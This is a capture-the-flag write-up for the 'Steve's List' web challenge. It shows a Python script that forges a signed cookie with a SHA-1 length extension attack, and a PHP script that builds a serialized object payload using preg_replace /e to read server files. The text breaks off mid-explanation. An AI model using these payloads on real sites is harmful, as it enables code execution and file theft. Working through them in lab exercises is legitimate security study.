# Steve's List

What a fun challenge! We have a pwned website and we have to figure out how to pwn it as well.

## Hash Length Extension
Looking at the `steves_list_backup.zip` we see the following files:
```
$ ls
cookies.php  includes  index.php  posts  root_data.php  Steve.png  templates
```

The first file to note is `cookies.php`:
```php
  2   if (isset($_COOKIE['custom_settings'])) {
        ...
 16     }
 17   } else {
 18     $custom_settings = array(0 => true);
 19     setcookie('custom_settings', urlencode(serialize(true)), time() + 86    400 * 30, "/");
 20     setcookie('custom_settings_hash', sha1(AUTH_SECRET . serialize(true)    ), time() + 86400 * 30, "/");
 21   }
```
Lines 19 and 20 show that if the cookie `custom_settings` isn't set aka if it is the user's first visit to the website, then two cookies are set: `custom_settings` and `custom_settings_hash`.

This can be verified in Google Chrome via the developer console (`Right Click -> Inspect Element -> 'Console'`)
```
> document.cookie
"custom_settings=b%253A1%253B; custom_settings_hash=2141b332222df459fd212440824a35e63d37ef69"
```

Line 5 of the same file is of key importance to us.
```php
  4     $custom_settings = urldecode($_COOKIE['custom_settings']);
  5     $hash = sha1(AUTH_SECRET . $custom_settings);
  6     if ($hash !== $_COOKIE['custom_settings_hash']) {
  7       die("Why would you hack Section Chief Steve's site? :(");
  8     }
```

Ah! So we are taking the cookie value in `custom_settings`, prepending the `AUTH_SECRET` and performing a sha1 hash. This screams to us, **LENGTH EXTENSION ATTACK**. For more details on this technique, [click here](http://en.wikipedia.org/wiki/Length_extension_attack).

Essentially, if we know the input data, the resulting hash, and the hash type, we can append malicious code to the initial data and receive a hash that will pass the given test. To do the hash calculation, we will utilize [hlextend](https://github.com/stephenbradshaw/hlextend).

To prove this, let's test hlextend.
```python
import hlextend
import requests
import subprocess

def php_urlencode(s):
    '''Return php urlencoded string'''
    print "ENCODE: " + s
    s = s.replace("\x00", "\0")
    encode_php = "<?php $text = <<<EOD\n{}\nEOD;\necho urlencode($text);\n?>".format(s)

    with open('encode_me.php', 'w') as f:
        f.write(encode_php)

    output = subprocess.check_output('php encode_me.php', shell=True)
    return output

url = 'http://steveslist.picoctf.com'
original_hash = '2141b332222df459fd212440824a35e63d37ef69'
original_data = 'b:1;'
appended_data = 'pwned'
key_length = 8

# Get our new hash for our new data
sha = hlextend.new('sha1')
cookie = sha.extend(appended_data, original_data, key_length, original_hash)
cookie_hash = sha.hexdigest()

# Send a request with our new cookie to verify our method works
output = php_urlencode(cookie)
cookies = {'custom_settings_hash': cookie_hash,
           'custom_settings': output}
print requests.get(url, cookies=cookies).text
```
In short, we appended **pwned** to the original data of **b:1;**, ran the new data through *hlextend.py* to receive our new hash, then requested the web page with our new cookie.
```html
$ python hlextend_test.py
<html>
  <head>
    <title>Steve's List</title>
    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" />
    <link rel="stylesheet" href="steves_list.css" />
    <script src="javascript" src="http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/js/bootstrap.min.js"></script>
  ...
  
  ...
<!-- POST 0wn3d by D43d4lu5 C0rp: OWNED OWNED OWNED OWNED OWNED OWNED SECTION CHIEF STEVE IS THE WORST<br><img src='./daedalus.png'><br><script>alert(1);</script><marquee>rekt</marquee><br><br><blink>we changed your secret</blink><br><br><marquee><blink>bet you'll never get control of this site back</blink></marquee><br><blink>look at this top quality tag we added</blink> --><!-- POST I'm Section Chief Steve: I'm the best.<br>The very best.<br><img src='./Steve.png'> -->
```
Because we see the HTML for the home page, we know that our cookie creation worked. Winning!

Now, what can we do with this new cookie creation?

## Unserialize object creation

Let's take a quick look at the `classes.php` file:
```php
  class Post {
    protected $title;
    protected $text;
    protected $filters;
    function __construct($title, $text, $filters) {
      $this->title = $title;
      $this->text = $text;
      $this->filters = $filters;
    }

    function get_title() {
      return htmlspecialchars($this->title);
    }

    function display_post() {
      $text = htmlspecialchars($this->text);
      foreach ($this->filters as $filter)
        $text = $filter->filter($text);
      return $text;
    }

    function __destruct() {
      // debugging stuff
      $s = "<!-- POST " . htmlspecialchars($this->title);
      $text = htmlspecialchars($this->text);
      foreach ($this->filters as $filter)
        $text = $filter->filter($text);
      $s = $s . ": " . $text;
      $s = $s . " -->";
      echo $s;
    }
  };

  $standard_filter_set = [new Filter("/\[i\](.*)\[\/i\]/i", "<i>\\1</i>"),
                          new Filter("/\[b\](.*)\[\/b\]/i", "<b>\\1</b>"),
                          new Filter("/\[img\](.*)\[\/img\]/i", "<img src='\\1'>"),
                          new Filter("/\[br\]/i", "<br>")];
?>
```

We have a *Post* class that contains the `title` of a post, the `text` of a post, and `filters` on a post to essentially write markdown-style data without having to worry about html tags (or at least that was the intended purpose ;-)

There is a hint in the destructor of `// debugging stuff`. Typically, this is something to look out for.

When called, the destructor calls each filter in the Post's `filters` on the `text` of the Post. Let's take a closer look at what the filter does.
```php
<?php
  class Filter {
    protected $pattern;
    protected $repl;
    function __construct($pattern, $repl) {
      $this->pattern = $pattern;
      $this->repl = $repl;
    }
    function filter($data) {
      return preg_replace($this->pattern, $this->repl, $data);
    }
  };
```

Ah ha! Good ole `preg_replace`. This function replaces the match of the regex `pattern` in `data` with `repl`.
Here is the given example in the code:
```php
new Filter("/\[i\](.*)\[\/i\]/i", "<i>\\1</i>")
```
Applying this filter will do the following:

Before
```
[i] Words words words [/i]
```
After
```
<i> Words words words </i>

```php
<?php
require_once('steves_list_backup/includes/classes.php');
$filter = [new Filter('/^(.*)/e', 'file_get_contents(\\\'{}\\\')')];

$text = "file_get_contents";
$text = htmlspecialchars($text);

$title = "yay_flag";
$title = htmlspecialchars($title);

$post = new Post($title, $text, $filter);

$post_ser = serialize($post);

$ser = $post_ser;
echo $ser;
?>
```



